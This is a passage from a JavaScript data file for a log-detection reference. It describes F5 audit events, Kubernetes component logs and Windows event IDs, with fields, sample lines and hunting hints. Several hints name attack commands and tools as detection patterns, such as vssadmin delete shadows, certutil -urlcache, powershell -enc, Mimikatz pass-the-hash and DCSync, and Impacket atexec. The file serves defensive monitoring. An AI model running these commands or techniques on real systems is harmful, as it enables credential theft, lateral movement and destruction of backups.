["f5-audit","f5-audit-asm-policy-weakened","Vô hiệu hóa / làm yếu chính sách bảo mật ASM","c","T1562.001","Chính sách ASM (WAF) được chuyển từ chế độ Blocking sang Transparent hoặc bị gỡ khỏi virtual server, làm mất khả năng chặn tấn công web thực tế.","client: tmsh hoặc tmui thực hiện thay đổi\nuser: tài khoản thực hiện lệnh\ntransaction: mã giao dịch cấu hình\nmodify { asm_policy { name ... } }: tên chính sách ASM bị sửa\nenforcement_mode: chế độ mới (transparent = chỉ log, không chặn)\nStatus: kết quả thực thi lệnh","Oct 24 13:40:15 bigip01.corp.local notice mcpd[6817]: 01070417:5: AUDIT - client tmsh, user admin - transaction #3349102-2 - object 0 - modify { asm_policy { name \"/Common/prod_app_policy\" enforcement_mode \"transparent\" } } [Status=Command OK]","Cảnh báo ngay khi một chính sách ASM đang bảo vệ ứng dụng production bị chuyển sang transparent hoặc gỡ khỏi virtual server ngoài cửa sổ bảo trì.","grep 'asm_policy' /var/log/audit | grep -i enforcement_mode"],

["f5-audit","f5-audit-mgmt-acl-widened","Mở rộng ACL truy cập quản trị SSH/GUI","h","T1686.002","Danh sách địa chỉ IP được phép truy cập SSHd hoặc httpd (giao diện quản trị) bị mở rộng ra toàn bộ Internet (0.0.0.0/0), phá vỡ kiểm soát truy cập quản trị.","client: tmsh hoặc tmui thực hiện thay đổi\nuser: tài khoản thực hiện lệnh\ntransaction: mã giao dịch cấu hình\nmodify { sshd { sshd_allow ... } } / httpd: dịch vụ quản trị bị sửa ACL\nsshd_allow / httpd_allow: danh sách dải IP mới được phép\nStatus: kết quả thực thi lệnh","Oct 24 02:11:33 bigip01.corp.local notice mcpd[6817]: 01070417:5: AUDIT - client tmsh, user root - transaction #3350017-2 - object 0 - modify { sshd { sshd_allow \"0.0.0.0/0\" } } [Status=Command OK]","So sánh dải IP mới của sshd_allow/httpd_allow với baseline đã phê duyệt, cảnh báo khi xuất hiện 0.0.0.0/0 hoặc dải public bất thường.","grep -E 'sshd_allow|httpd_allow' /var/log/audit"],

["f5-audit","f5-audit-logging-disabled","Tắt hoặc hạ mức audit logging","c","T1562.001","Biến hệ thống config.auditing bị đổi sang disable (hoặc hạ từ verbose/all xuống enable/disable), khiến các thay đổi cấu hình sau đó không còn được ghi log.","client: tmsh hoặc tmui thực hiện thay đổi\nuser: tài khoản thực hiện lệnh (thường cần quyền admin/root)\ntransaction: mã giao dịch cấu hình - đây là dòng AUDIT cuối liên quan đến mức log trước khi tắt\ndb_variable_name: tên biến bị sửa (config.auditing)\ndb_variable_value: giá trị mới (disable/enable/verbose/all)\nStatus: kết quả thực thi lệnh","Oct 24 22:58:09 bigip01.corp.local notice mcpd[6817]: 01070417:5: AUDIT - client tmsh, user root - transaction #3351440-2 - object 0 - modify { db_variable { db_variable_name \"config.auditing\" db_variable_value \"disable\" } } [Status=Command OK]","Coi mọi sự kiện đổi config.auditing sang disable (hoặc im lặng kéo dài bất thường trong /var/log/audit) là dấu hiệu nghi ngờ cần điều tra ngay.","grep 'config.auditing' /var/log/audit; tmsh show sys db config.auditing"],

["f5-audit","f5-audit-vs-pool-deleted","Xóa Virtual Server hoặc Pool","h","T1489","Một virtual server hoặc pool đang phục vụ traffic production bị xóa, có thể gây gián đoạn dịch vụ hoặc là hành vi phá hoại sau khi đã xâm nhập.","client: tmsh hoặc tmui thực hiện thay đổi\nuser: tài khoản (hoặc service account) thực hiện lệnh xóa\ntransaction: mã giao dịch cấu hình\nobj_delete { virtual {...} } / pool: loại đối tượng bị xóa và tên đầy đủ (partition/name)\nStatus: kết quả thực thi lệnh","Oct 24 03:27:51 bigip01.corp.local notice mcpd[6140]: 01070417:5: AUDIT - client tmsh, user svc_automation - transaction #3352980-2 - object 0 - obj_delete { virtual { virtual_name \"/Common/vs_payments_443\" } } [Status=Command OK]","Đối chiếu mọi lệnh obj_delete trên virtual/pool production với change ticket đã duyệt, đặc biệt khi thực hiện ngoài giờ hoặc bởi service account.","grep 'obj_delete' /var/log/audit | grep -E 'virtual|pool'"]
,
["k8s-comp","kube-controller-manager","Process log của Controller Manager","i","","Log hoạt động reconcile của các controller (Node, ReplicaSet, Job, ServiceAccount...) và bầu leader khi chạy nhiều replica (HA).","I/W/E (ký tự đầu): mức log klog (Info/Warning/Error)\n1025 hh:mm:ss.microsec: ngày giờ nội bộ klog\nthreadid: mã luồng ghi log\nnode_lifecycle_controller.go / garbagecollector.go / range_allocator.go: file mã nguồn phát sinh log\nmessage: nội dung — vd trạng thái Node (not-Ready/Ready, \"master disruption mode\"), tiến trình garbage collector, hoặc gán PodCIDR cho node mới","I1025 15:28:10.821080       1 node_lifecycle_controller.go:1091] \"Controller detected that all Nodes are not-Ready. Entering master disruption mode\"\nI1025 15:28:30.965644       1 node_lifecycle_controller.go:1110] \"Controller detected that some Nodes are Ready. Exiting master disruption mode\"","Entering/Exiting \"master disruption mode\" lặp lại nhiều lần (không phải lúc khởi động cluster) là dấu hiệu node liên tục mất kết nối với control plane — có thể do quá tải, lỗi mạng, hoặc tấn công từ chối dịch vụ nhắm vào kubelet/API server.","journalctl -u kube-controller-manager --since \"1 hour ago\" | grep -iE \"leaderelection|error\""],
["k8s-comp","kube-scheduler","Process log của Scheduler","i","","Log quyết định đặt pod vào node (bind) và bầu leader khi chạy HA; cảnh báo khi không tìm được node phù hợp.","W (ký tự đầu): mức log klog — Warning\n1025 hh:mm:ss.microsec: ngày giờ nội bộ klog\nthreadid: mã luồng ghi log\nauthentication.go:398/399: file mã nguồn phát sinh cảnh báo\nmessage: nội dung — thiếu cấu hình --authentication-kubeconfig khiến scheduler bỏ qua xác thực cho endpoint của chính nó","W1025 15:28:01.700284       1 authentication.go:398] Continuing without authentication configuration. This may treat all requests as anonymous.\nW1025 15:28:01.700291       1 authentication.go:399] To require authentication configuration lookup to succeed, set --authentication-tolerate-lookup-failure=false","Cảnh báo \"Continuing without authentication configuration\" xuất hiện khi scheduler không được cấp --authentication-kubeconfig — endpoint metrics/healthz (10259) của nó khi đó coi mọi request là anonymous; cần kiểm tra endpoint này có bị lộ ra ngoài node hay không.","journalctl -u kube-scheduler --since \"1 hour ago\" | grep -iE \"error|failed\""],
["k8s-comp","kube-proxy","Process log của kube-proxy","i","","Log chế độ proxy (iptables/ipvs/nftables) được chọn lúc khởi động và lỗi khi đồng bộ rule chuyển tiếp traffic cho Service.","I/E (ký tự đầu): mức log klog (Info/Error)\n1025 hh:mm:ss.microsec: ngày giờ nội bộ klog\nthreadid: mã luồng ghi log\nserver_linux.go / server.go: file mã nguồn phát sinh log\nmessage: nội dung — vd \"Using iptables Proxier\" lúc khởi động, hoặc cảnh báo cấu hình nodePortAddresses chưa được giới hạn (NodePort nhận kết nối trên mọi IP cục bộ)","I1025 15:28:12.994037       1 server_linux.go:144] \"Using iptables Proxier\"\nE1025 15:28:12.976179       1 server.go:256] \"Kube-proxy configuration may be incomplete or incorrect\" err=\"nodePortAddresses is unset; NodePort connections will be accepted on all local IPs. Consider using `--nodeport-addresses primary`\"","nodePortAddresses chưa giới hạn nghĩa là mọi NodePort Service nhận kết nối trên TẤT CẢ IP cục bộ của node (kể cả IP quản trị nội bộ) — mở rộng bề mặt tấn công hơn mức cần thiết nếu node có nhiều network interface.","journalctl -u kube-proxy --since \"1 hour ago\" | grep -iE \"error|failed\""]
];

/* English overlay for E, aligned by index: {n, d, f, h} -- path/sample/query are language-neutral and come from E. */
const EN_FIELDS = [

{"n":"Successful logon","d":"An account logged on successfully. The most important field is LogonType, which indicates the logon method.","f":"LogonType=2: Interactive (at the keyboard/console)\nLogonType=3: Network (SMB, share, WMI, PsExec)\nLogonType=4: Batch (scheduled task)\nLogonType=5: Service\nLogonType=7: Unlock screen\nLogonType=8: NetworkCleartext (password sent in clear text, e.g. IIS Basic)\nLogonType=9: NewCredentials (runas /netonly, a pass-the-hash indicator when paired with seclogo)\nLogonType=10: RemoteInteractive (RDP)\nLogonType=11: CachedInteractive (cached credentials, off-domain machine)\nElevatedToken: %%1842 = Yes, the session has admin rights\nAuthenticationPackageName: NTLM / Kerberos / Negotiate\nIpAddress, WorkstationName: logon source","h":"LogonType 10 from an IP outside the admin range; LogonType 3 + NTLM from one source to many hosts within minutes (lateral movement); LogonType 9 with LogonProcessName=seclogo (a Mimikatz sekurlsa::pth-style pass-the-hash indicator); a service account logging on interactively."},

{"n":"Failed logon","d":"A failed logon attempt. Status/SubStatus gives the exact reason.","f":"0xC000006A: Wrong password (user exists)\n0xC0000064: User does not exist\n0xC0000234: Account is locked out\n0xC0000072: Account is disabled\n0xC000006F: Logon outside allowed hours\n0xC0000070: Workstation restriction\n0xC0000071: Password expired\n0xC0000193: Account expired\n0xC0000224: User must change password at next logon\n0xC000015B: User does not have the right to log on with this logon type","h":"Password spray: one IP trying many users, each only a few times. Brute force: one user tried many times. Repeated 0xC0000064 in a row indicates username enumeration. An unfamiliar WorkstationName (KALI, random WIN-xxxxx) is a sign of attack tooling."},

{"n":"Logoff","d":"A logon session ends. Correlate with 4624 via TargetLogonId to compute session duration.","f":"TargetLogonId: matches the TargetLogonId of the corresponding 4624","h":""},

{"n":"User initiated logoff","d":"The user clicked Sign out (interactive/RDP session). A 4634 may follow.","f":"TargetUserName: Account that signed out\nTargetDomainName: Domain/host the account belongs to\nTargetLogonId: Logon session ID (matches the LogonId from the corresponding 4624)","h":""},

{"n":"Logon using explicit credentials","d":"A process uses credentials different from the current session (runas, PsExec -u, net use /user, a mapped drive).","f":"SubjectUserName: the user running the process\nTargetUserName: the credential being used\nTargetServerName: destination machine\nProcessName: the initiating process","h":"One user using several different credentials against many servers; ProcessName is an unfamiliar tool or located in a Temp/ProgramData folder."},

{"n":"Special privileges assigned at logon","d":"Accompanies 4624 when the account has admin-level rights (SeDebugPrivilege, SeBackupPrivilege, SeTcbPrivilege, etc.).","f":"PrivilegeList: the list of privileges assigned","h":"An account not on the known admin list still generating 4672: check for unauthorized privilege grants."},

{"n":"Process creation","d":"Logs every new process. To capture CommandLine you must enable the GPO: Administrative Templates > System > Audit Process Creation > Include command line in process creation events.","f":"NewProcessName, ParentProcessName: the child and parent process\nCommandLine: command-line arguments\nTokenElevationType=%%1936: Type 1, full token (UAC disabled or built-in admin)\nTokenElevationType=%%1937: Type 2, elevated (Run as administrator)\nTokenElevationType=%%1938: Type 3, limited token","h":"Office/browser spawning cmd, powershell, wscript, mshta; rundll32/regsvr32 loading a URL; certutil -urlcache; vssadmin delete shadows; wmic shadowcopy delete; bcdedit /set recoveryenabled no; whoami /priv, net group \"domain admins\" right after logon."},

{"n":"Process termination","d":"Used to compute process lifetime. Usually filtered out due to noise.","f":"SubjectUserName: Account that owned the process\nSubjectLogonId: Logon session ID of the subject\nProcessId: PID of the terminated process\nProcessName: Full path of the executable\nStatus: NTSTATUS exit code (0x0 = normal exit)","h":""},

{"n":"Service installed (Security)","d":"A new service is installed. Requires Audit Security System Extension enabled. The matching event always present in System is 7045.","f":"ServiceFileName: the executable path/command\nServiceStartType: 2=Auto, 3=Manual, 4=Disabled\nServiceAccount: usually LocalSystem","h":"See the 7045 entry for suspicious ImagePath patterns."},

{"n":"Scheduled task created","d":"A new task is registered. TaskContent is the full XML, containing the command to run.","f":"TaskName: the task's name and path\nTaskContent: XML — check the <Command> and <Arguments> tags","h":"A task masquerading under the \\Microsoft\\Windows\\ path but created by a regular user; Command pointing to powershell, cmd, mshta, rundll32, or a file under AppData/Temp/Public."},

{"n":"Scheduled task deleted","d":"A task is deleted; watch for a task created and deleted within a short window (Impacket atexec-style remote execution).","f":"SubjectUserName: Account that deleted the task\nSubjectDomainName: Domain of that account\nSubjectLogonId: Logon session ID\nTaskName: Full path of the deleted scheduled task","h":"A 4698 → 4699 pair seconds apart with a random task name: an Impacket atexec indicator."},

{"n":"Scheduled task enabled / disabled / updated","d":"4700 — the task is enabled, 4701 — the task is disabled, 4702 — the task is updated.","f":"SubjectUserName: Account that made the change\nSubjectDomainName: Domain of that account\nSubjectLogonId: Logon session ID\nTaskName: Path of the task being enabled/disabled/updated\nTaskContentNew: New task XML definition (4702 only), shows the action/command to run","h":"An existing system task with its Command modified: a hard-to-detect persistence technique."},

{"n":"System audit policy changed","d":"The audit policy is changed, often to stop logging before taking action.","f":"AuditPolicyChanges: 'Success removed' / 'Failure removed' are the most concerning values","h":"Every 4719 outside a planned GPO change window needs to be verified."},

{"n":"User account created","d":"A new account is created (local or domain, logged on the machine/DC that performed it).","f":"UserAccountControl: the account's initial flags","h":"An account created outside the normal process, named to resemble a system account, or immediately added to an admin group (see 4728/4732)."},

{"n":"Account enabled","d":"A disabled account is re-enabled.","f":"SubjectUserName: Account that performed the enable action\nSubjectLogonId: Logon session ID of the subject\nTargetUserName: Account that was re-enabled\nTargetDomainName: Domain of that account\nTargetSid: SID of the enabled account","h":"Re-enabling Guest or a former employee's account."},

{"n":"User changed their own password","d":"The user changes their own password.","f":"SubjectUserName: Account changing its own password (= TargetUserName)\nTargetUserName: Account whose password changed\nTargetDomainName: Domain of the account\nTargetSid: SID of the account","h":""},

{"n":"Password reset for another account","d":"One account resets the password of another account.","f":"SubjectUserName: Account performing the reset (different from Target)\nSubjectLogonId: Logon session ID of the subject\nTargetUserName: Account whose password was reset\nTargetDomainName: Domain of the target account\nTargetSid: SID of the target account","h":"A privileged or service account's password being reset; helpdesk performing bulk resets."},

{"n":"Account disabled","d":"An account is disabled.","f":"SubjectUserName: Account that disabled the target\nTargetUserName: Account that was disabled\nTargetDomainName: Domain of the account\nTargetSid: SID of the disabled account","h":"Multiple admin accounts disabled in bulk: an attacker locking out responders before encrypting."},

{"n":"Account deleted","d":"An account is deleted.","f":"SubjectUserName: Account that performed the deletion\nTargetUserName: Account that was deleted\nTargetDomainName: Domain of the deleted account\nTargetSid: SID of the deleted account (useful for lookups after the account no longer exists)","h":"An account created and deleted within a few hours."},

{"n":"Account attribute changed","d":"A user attribute changes (UAC flags, indirect SPN, profile path, etc.).","f":"UserAccountControl: watch for 'Don't Require Preauth' (AS-REP roasting) and 'Password Not Required'\nOldUacValue / NewUacValue: compare before and after","h":"Setting the DONT_REQ_PREAUTH flag (0x400000) on an account: preparation for an AS-REP roast."},

{"n":"Account locked out","d":"Logged on the DC (PDC Emulator). CallerComputerName is the machine responsible for the failed attempts.","f":"CallerComputerName: the source causing the lockout","h":"Many accounts locked out at once from the same CallerComputerName: spraying/brute force."},

{"n":"Account unlocked","d":"The account is unlocked.","f":"SubjectUserName: Account that performed the unlock (usually helpdesk/admin)\nTargetUserName: Account that was unlocked\nTargetDomainName: Domain of the account\nTargetSid: SID of the account","h":""},

{"n":"Member added/removed from a global (domain) group","d":"4728 adds a member, 4729 removes a member from a global security group, e.g. Domain Admins.","f":"TargetUserName: the group name; MemberName: the member's DN","h":"Alert immediately when the group is Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Backup Operators, or DnsAdmins."},

{"n":"Member added/removed from a local group","d":"A local group on the machine (e.g. Administrators, Remote Desktop Users) or a domain local group.","f":"SubjectUserName: Account that added/removed the member\nMemberSid: SID of the account added to/removed from the group\nTargetUserName: Name of the local group that changed (e.g. Administrators)\nTargetDomainName: Domain/scope holding the group (Builtin, local hostname...)","h":"A user adding themselves to Administrators on a workstation."},

{"n":"Member added/removed from a universal group","d":"A universal group, e.g. Enterprise Admins.","f":"SubjectUserName: Account that made the change\nMemberName: Distinguished Name of the member added/removed\nTargetUserName: Name of the universal group changed (e.g. Enterprise Admins)\nTargetDomainName: Domain containing the group","h":""},

{"n":"Kerberos TGT request (AS-REQ)","d":"Logged on the DC when a client requests a TGT.","f":"Status=0x0: success\nStatus=0x6: user does not exist\nStatus=0x12: account disabled/locked/expired\nStatus=0x17: password expired\nPreAuthType=0: no pre-authentication, an AS-REP roasting indicator\nTicketEncryptionType=0x17: RC4, suspicious in an environment already using AES (0x11/0x12)","h":"PreAuthType=0 for a regular account; repeated Status=0x6 from one IP (username enumeration via Kerberos, e.g. kerbrute)."},

{"n":"Kerberos service ticket request (TGS)","d":"Logged on the DC when requesting a service ticket for an SPN. The primary source for detecting Kerberoasting.","f":"ServiceName: the service account (ignore krbtgt and machine accounts ending in $)\nTicketEncryptionType=0x17: RC4-HMAC, suspected Kerberoasting\nTicketEncryptionType=0x12: AES256 (normal)\nStatus=0x0: success","h":"One user requesting TGS tickets for many different SPNs using RC4 within minutes; create a honey SPN (a decoy account with an SPN) and alert on every 4769 against it."},

{"n":"Kerberos pre-authentication failed","d":"Logged on the DC; the Kerberos equivalent of 4625.","f":"FailureCode=0x18: wrong password\nFailureCode=0x12: account disabled/locked\nFailureCode=0x25: clock skew","h":"Spraying via Kerberos doesn't generate 4625 on the DC — it generates 4771 with 0x18."},

{"n":"NTLM authentication","d":"The DC (or a local machine, for a local account) validates NTLM credentials.","f":"Status=0x0: success\nStatus=0xC000006A: wrong password\nStatus=0xC0000064: user does not exist\nWorkstation: the client machine","h":"NTLM against an admin account in an environment that favors Kerberos; an unfamiliar Workstation."},

{"n":"RDP session reconnect / disconnect","d":"4778 — reconnect, 4779 — disconnect of a terminal session or fast user switching.","f":"ClientName, ClientAddress: the client machine and IP","h":""},

{"n":"DSRM password set","d":"The Directory Services Restore Mode password on a DC is reset; can be used as a backdoor.","f":"SubjectUserName: Account that set the DSRM password\nSubjectDomainName: Domain of that account\nWorkstation Name: Machine (usually the DC) where the action ran\nStatus: Result code (0x0 = success)","h":"Every 4794 outside a planned process needs to be investigated."},

{"n":"Local group membership enumerated for a user","d":"A process reads a user's local group membership.","f":"CallerProcessName: the process performing the query","h":"Filter out explorer.exe and mmc.exe; keep net.exe, powershell.exe, and unfamiliar processes."},

{"n":"Local group membership enumerated","d":"Members of a local (security) group are enumerated.","f":"SubjectUserName: Account/process performing the enumeration\nTargetUserName: Local group whose members were listed (e.g. Administrators)\nTargetDomainName: Domain/scope of the group\nCallerProcessName: Process that called the enumeration API (e.g. net1.exe, PowerShell)","h":"Repeated 4799 across many hosts from the same account: BloodHound/SharpHound-style reconnaissance."},

{"n":"Operation performed on an AD object","d":"Logged when the AD object has a SACL. Used to detect DCSync.","f":"Properties contains {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}: DS-Replication-Get-Changes\nProperties contains {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}: DS-Replication-Get-Changes-All\nProperties contains {89e95b76-444d-4c62-991a-0facbeda640c}: Get-Changes-In-Filtered-Set\nAccessMask=0x100: Control Access","h":"Replication rights used by an account that is not a DC machine account (doesn't end in $): DCSync (Mimikatz lsadump::dcsync, secretsdump)."},

{"n":"Object access (file, registry)","d":"Only logged when the object has a SACL. Commonly used to monitor sensitive data folders.","f":"AccessMask=0x1: ReadData\nAccessMask=0x2: WriteData\nAccessMask=0x10000: DELETE","h":"A user deleting/writing hundreds of files within minutes: ransomware or sabotage."},

{"n":"Handle requested to an object","d":"A request to open a handle (including denied requests). With a SACL on lsass, this can catch attempts to read lsass memory.","f":"SubjectUserName: Account requesting the handle\nObjectType: Object type (File, Process, Key...)\nObjectName: Path/identifier of the accessed object\nProcessName: Process making the request\nAccessMask: Requested access rights (hex, map to specific permissions)","h":"An unfamiliar process opening a handle to lsass.exe with memory-read rights."},

{"n":"Registry value modified","d":"Requires a SACL on the key. Suited to monitoring the Run key, IFEO, and Winlogon.","f":"SubjectUserName: Account that modified the registry\nObjectName: Registry key path\nObjectValueName: Name of the value that changed\nNewValue: New value written\nProcessName: Process that made the change (e.g. reg.exe)","h":""},

{"n":"Permissions on an object changed","d":"The DACL of a file/registry/object is modified.","f":"OldSd / NewSd: SDDL before and after","h":"NewSd adding rights for Everyone (WD) or Authenticated Users (AU) on a system object."},

{"n":"Privileged service called","d":"Very noisy; useful when filtered to SeTcbPrivilege, SeDebugPrivilege on an unfamiliar process.","f":"SubjectUserName: Account calling the privileged service\nService: Name of the service called (often \"-\")\nPrivilegeList: Privileges exercised (e.g. SeDebugPrivilege, SeTcbPrivilege)\nProcessName: Process making the call","h":""},

{"n":"Token right adjusted","d":"A process enables/disables a privilege in its own token.","f":"SubjectUserName: Account owning the process\nProcessName: Process adjusting privileges in its own token\nEnabledPrivilegeList: Privileges enabled\nDisabledPrivilegeList: Privileges disabled","h":"powershell enabling SeDebugPrivilege: typically precedes reading lsass."},

{"n":"Computer account created / modified","d":"4741 — a new computer account; 4742 — a change (e.g. rename, SPN change, delegation).","f":"SubjectUserName: Account that created/modified the computer account\nTargetUserName: Computer account name (ends with $)\nTargetDomainName: Domain containing the computer account\nDnsHostName: DNS name assigned to the computer\nServicePrincipalNames: SPNs registered for the computer account","h":"A regular user creating a computer account (default MachineAccountQuota of 10): a precursor to RBCD or noPac (CVE-2021-42278/42287)."},

{"n":"SID History added","d":"SID History is added (4765) or the attempt fails (4766). Rarely legitimate outside a domain migration.","f":"SubjectUserName: Account that added the SID History\nTargetUserName: Account receiving the SID History\nTargetDomainName: Domain of the target account\nSidHistory: SID added to the sIDHistory attribute (can impersonate that SID's rights)","h":"SID History containing RID 512/519 (Domain/Enterprise Admins)."},

{"n":"ACL set on an admin-group account","d":"SDProp reapplies the ACL from AdminSDHolder (runs every 60 minutes).","f":"SubjectUserName: Account/computer performing the action (usually the DC$ running SDProp)\nTargetUserName: Account that had the AdminSDHolder ACL reapplied\nTargetDomainName: Domain of the account\nTargetSid: SID of the account","h":"Correlate with 5136 on CN=AdminSDHolder to catch an ACL backdoor being planted."},

{"n":"Domain trust created / deleted","d":"A new trust to another domain.","f":"SubjectUserName: Account creating/removing the trust\nDomainName: Name of the partner domain in the trust\nTrustType: Trust type (1=Windows NT, 2=Active Directory...)\nTrustDirection: Trust direction (1=inbound, 2=outbound, 3=bidirectional)","h":""},

{"n":"Domain policy changed","d":"The domain's password policy or lockout policy changes.","f":"SubjectUserName: Account that changed the policy\nDomainName: Domain whose policy changed\nMinPasswordLength: New minimum password length\nLockoutThreshold: New max failed logon attempts before lockout","h":"LockoutThreshold set to 0, or password length reduced."},

{"n":"Special-group logon","d":"Logged when an account belonging to a group configured in Special Groups (SpecialGroups registry key) logs on.","f":"TargetUserName: Account logging on that belongs to a special group\nLogonId: Logon session ID (matches the corresponding 4624)\nSidList: SIDs of the special groups the account belongs to","h":"Configure Special Groups = Domain Admins to get a dedicated log entry for every DA logon."},

{"n":"AD object modified","d":"An AD object's attribute changes (requires Audit Directory Service Changes and a SACL enabled).","f":"ObjectDN: the object being modified\nAttributeLDAPDisplayName: the attribute\nOperationType: Value Added / Value Deleted","h":"Modifications to a GPO, AdminSDHolder, msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), servicePrincipalName (targeted Kerberoast), or msDS-KeyCredentialLink (Shadow Credentials)."},

{"n":"AD object created","d":"A new object in AD (OU, GPO, user, computer, etc.).","f":"SubjectUserName: Account that created the object\nObjectDN: Full Distinguished Name of the new object\nObjectGUID: Unique AD GUID of the object\nObjectClass: Object type (user, computer, groupPolicyContainer, organizationalUnit...)","h":""},

{"n":"Network share accessed","d":"A share is accessed (logged once per session).","f":"ShareName: watch for C$, ADMIN$, IPC$","h":"Accessing ADMIN$/C$ from one workstation to another: lateral movement."},

{"n":"File access check within a share","d":"Per-file/pipe access detail over a share. Very noisy, but useful for IPC$.","f":"RelativeTargetName: the file or named pipe","h":"IPC$ with the svcctl pipe (remote service creation), atsvc (remote task), samr/lsarpc (reconnaissance); ADMIN$ with a new .exe file."},

{"n":"Network share created","d":"A new share is added.","f":"SubjectUserName: Account that created the share\nShareName: Share name (UNC), e.g. \\\\*\\data$\nShareLocalPath: Local filesystem path being shared","h":""},

{"n":"Windows Filtering Platform: connection allowed / blocked","d":"5156 — connection allowed, 5157 — blocked. Very noisy; usually only enabled during an investigation.","f":"Direction, SourceAddress, DestAddress, DestPort, Application","h":""},

{"n":"Windows Firewall rule added / changed / deleted","d":"A firewall rule changes (logged in Security). For the dedicated Firewall channel, see the Other entry.","f":"SubjectUserName: Account that changed the rule\nProfileChanged: Firewall profile affected (Domain/Private/Public)\nRuleId: Identifier of the rule\nRuleName: Name/description of the rule added/changed/removed","h":""},

{"n":"Security log cleared","d":"The Security audit log is cleared (wevtutil cl, Clear-EventLog, Event Viewer).","f":"SubjectUserName: Account that cleared the log\nSubjectDomainName: Domain of that account\nSubjectLogonId: Logon session ID (used to trace the session that cleared the log)","h":"Always alert on this. Also check 104 (System) and look for a time gap in collected logs."},

{"n":"System time changed","d":"The system clock is changed. Filter out small adjustments from time-sync services.","f":"SubjectUserName: Account that changed the time\nPreviousTime: System time before the change\nNewTime: System time after the change\nProcessName: Process that made the change (e.g. cmd.exe, w32tm.exe)","h":""},

{"n":"Windows startup / shutdown (Security)","d":"4608 Windows starting up; 4609 shutting down.","f":"TimeCreated: This event carries no other EventData; its timestamp marks when Windows started booting (4608) or began shutting down (4609)","h":""},

{"n":"Workstation locked / unlocked","d":"Used to determine who was physically present at the machine.","f":"TargetUserName: Account on the session locked/unlocked\nTargetDomainName: Domain of the account\nTargetLogonId: Related logon session ID\nSessionId: Terminal Services/console session ID","h":""},

{"n":"Remote Desktop access denied","d":"A user not in the Remote Desktop Users group attempted RDP.","f":"AccountName: Account attempting the RDP connection\nAccountDomain: Domain of the account\nClientAddress: Source IP address of the RDP connection","h":""},

{"n":"New external device recognized","d":"A new PnP device (USB, phone). Requires Audit PNP Activity to be enabled.","f":"SubjectUserName: Account/computer that logged the device (usually the computer account)\nDeviceDescription: Device description (e.g. Mass Storage Device)\nClassName: Device class (USB, DiskDrive...)\nDeviceId: Hardware ID (VID/PID) identifying the device model","h":""},

{"n":"Credential read from Credential Manager","d":"Credential Manager was read. Noisy with legitimate applications.","f":"SubjectUserName: Account that read the credential\nTargetName: Name of the credential queried (e.g. saved RDP/SMB target)\nType: Credential type (1=Generic, 2=Domain Password...)\nCountOfCredentialsReturned: Number of credentials returned","h":"An unfamiliar process reading many credentials in a short time."},

{"n":"New service installed (System)","d":"Always present in System, no audit policy required. The best source for catching PsExec, Impacket, and Cobalt Strike creating a service.","f":"ServiceName, ImagePath (Service File Name), ServiceType, StartType, AccountName","h":"ImagePath contains cmd /c, powershell -enc, \\\\127.0.0.1\\ADMIN$, a Temp/ProgramData/Public path; a random 4-8 character service name (smbexec, Cobalt Strike psexec); or a new unsigned (kernel-mode) driver."},

{"n":"Service start type changed","d":"A service's start type changes (auto/manual/disabled).","f":"param1: Display name of the service that changed\nparam2: Previous start type (auto/manual/disabled)\nparam3: New start type","h":"A security, backup, or VSS service is set to disabled."},

{"n":"Service status changed","d":"A service transitions to running/stopped. Noisy, but helps build a timeline.","f":"param1: Name of the service that changed state\nparam2: New state (running/stopped...)","h":"Multiple SQL, Exchange, or backup services stopped close together: a precursor to encryption."},

{"n":"Service terminated unexpectedly","d":"A service crashed. May be due to an exploit or being killed.","f":"param1: Name of the service that crashed\nparam2: Running count of how many times this service has crashed","h":"An EDR/AV agent crashing repeatedly."},

{"n":"Event log cleared","d":"A log (System, Application, or any channel) was cleared. If Security was cleared, see 1102.","f":"SubjectUserName: Account that cleared the log\nChannel: Name of the log/channel cleared (System, Application...)\nBackupPath: Path to the backup file saved before clearing (usually empty)","h":"Always alert."},

{"n":"Event Log service started / stopped","d":"Approximates boot time (6005) and a normal shutdown (6006).","f":"TimeCreated: This event carries no specific EventData; its timestamp marks when the Event Log service started (6005, approximates boot) or stopped (6006, approximates a normal shutdown)","h":""},

{"n":"Unexpected shutdown","d":"The previous shutdown was abnormal (power loss, crash, killed).","f":"param1: Time of the previous unexpected shutdown\nparam2: Date of the previous unexpected shutdown","h":""},

{"n":"Shutdown/restart requested by process/user","d":"Who and which process requested the shutdown/restart.","f":"param1: Process requesting the shutdown/restart (with computer name in parentheses)\nparam2: Name of the computer being shut down/restarted\nparam3: Reason text\nparam4: Shutdown reason code (hex)\nparam5: Requested action (restart/power off)\nparam7: Account that issued the command","h":"Mass server restarts outside maintenance windows."},

{"n":"Kernel-Power: unclean restart","d":"The system rebooted without a clean shutdown (crash, power loss, BSOD).","f":"BugcheckCode: Bugcheck code if a BSOD preceded the reboot (0 = none recorded)\nBugcheckParameter1: Additional parameter accompanying the bugcheck\nPowerButtonTimestamp: Timestamp the power button was pressed (0 if not applicable)","h":""},

{"n":"OS startup / shutdown (Kernel-General)","d":"Precise boot and shutdown timestamps.","f":"StartTime: Time the OS started (event 12 only; event 13 uses the event's own TimeCreated as the shutdown marker)","h":""},

{"n":"Windows Update succeeded / failed","d":"Provider WindowsUpdateClient. Check patch status.","f":"updateTitle: Title of the update\nupdateGuid: GUID identifying the update\nupdateRevisionNumber: Revision number of the update\nerrorCode: Installation error code (event 20 only, on failure)","h":""},

{"n":"Malware detected","d":"Defender detected a threat.","f":"Threat Name, Path, Process Name, Detection User","h":"Names like HackTool:*, Behavior:*, Trojan:Win32/CobaltStrike on a server."},

{"n":"Malware remediated","d":"A remediation action (quarantine, remove) completed successfully.","f":"Threat Name: Name of the detected threat\nSeverity Name: Severity level (Severe, High, Medium...)\nPath: File/process path containing the threat\nAction Name: Action taken (Quarantine, Remove, Allow...)","h":""},

{"n":"Malware remediation failed","d":"Could not quarantine/remove; the threat may still be present.","f":"Threat Name: Name of the threat\nPath: Location that could not be remediated\nAction Name: Action attempted (Remove, Quarantine...)\nError Code: Error code returned\nError Description: Description of the error","h":""},

{"n":"Real-time protection disabled","d":"Real-time protection was disabled.","f":"Product Name: Name of the protection product (Microsoft Defender Antivirus)\nProduct Version: Defender engine version at log time","h":""},

{"n":"Defender configuration changed","d":"Configuration was modified, including adding an exclusion.","f":"Old Value / New Value: the registry key that changed","h":"A new exclusion for a Temp/Public/ProgramData folder, or for the .exe/.dll extension."},

